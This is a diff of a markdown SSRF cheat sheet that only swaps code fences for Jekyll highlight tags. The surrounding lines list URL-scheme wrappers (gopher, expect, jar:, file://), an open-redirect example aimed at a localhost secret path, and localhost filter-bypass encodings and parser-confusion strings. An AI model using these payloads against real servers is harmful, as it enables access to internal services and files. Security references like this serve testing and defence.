@@ -61,7 +61,7 @@ The URL schemas have been sorted by framework / language.
 
 The following wrappers are potentiall expected URL schema wrappers found within PHP environments (for some schema curl-wrappers would need to be enabled). 
 
-```
+{% highlight bash %}
 gopher://
 fd://
 expect://
@@ -78,26 +78,25 @@ pop3://
 mailto://
 smtp://
 telnet://
-```
+{% endhighlight %}
 
 #### ASP.NET SSRF Wrappers / URL Schema 
 
 The following wrappers are potentiall expected URL schema wrappers found within ASP.NET environments (gopher legacy only). 
 
-```
+{% highlight bash %}
 gopher://
 ftp://
 file://
 http://
 https://
-
-```
+{% endhighlight %}
 
 #### Java SSRF Wrappers / URL Schema 
 
 The following wrappers are expected within Java environments, and can be used to potentially exploit [LFI](https://highon.coffee/blog/lfi-cheat-sheet/) vulnerabilities. 
 
-```
+{% highlight bash %} 
 ftp://
 file://
 http://
@@ -110,7 +109,7 @@ jar:http://localhost!/
 jar:http://127.0.0.1!/
 jar:http://0.0.0.0!/
 jar:ftp://local-domain.com!/
-```
+{% endhighlight %}
 
 <div class="note tip">
   <h5>NOTE: OpenJDK 8+ Redirects</h5>
@@ -123,7 +122,7 @@ jar:ftp://local-domain.com!/
 
 The following wrappers are expected with environments using cURL. 
 
-```
+{% highlight bash %}
 file:///
 dict://
 sftp://
@@ -137,7 +136,7 @@ imap://
 pop3://
 smtp://
 telnet://
-```
+{% endhighlight %}
 
 
 ### Open Redirect SSRF Bypass 
@@ -146,15 +145,15 @@ Open redirects can potentially be used to bypass server side whitelist filtering
 
 Example: 
 
-```
+{% highlight bash %}
 /foo/bar?vuln-function=http://127.0.0.1:8888/secret
-```
+{% endhighlight %}
 
 ### Basic locahost bypass attempts 
 
 Localhost bypass:
 
-```
+{% highlight bash %}
 All IPv4: 0
 All IPv6: ::
 All IPv4: 0.0.0.0
@@ -165,11 +164,11 @@ IPv4 mapped IPv6 address: 0:0:0:0:0:FFFF:7F00:0001
 8-Bit Octal conversion: 0177.00.00.01
 32-Bit Octal conversion: 017700000001
 32-Bit Hex conversion: 0x7f000001
-```
+{% endhighlight %}
 
 various bypasses: 
 
-```
+{% highlight bash %}
 127.0.0.1:80
 127.0.0.1:443
 127.0.0.1:22
@@ -222,17 +221,17 @@ st:00011211aaaa
 127.1.1.1:80\@@127.2.2.2:80/
 127.1.1.1:80:\@@127.2.2.2:80/
 127.1.1.1:80#\@127.2.2.2:80/
-```
+{% endhighlight %}
 
 
 ### hosts file bypass attempts 
 
 ### Enclosed Alphanumeric 
 
-```
+{% highlight bash %}
 http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
 http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
-```
+{% endhighlight %}
 
 ## DNS rebinding attempts 
 
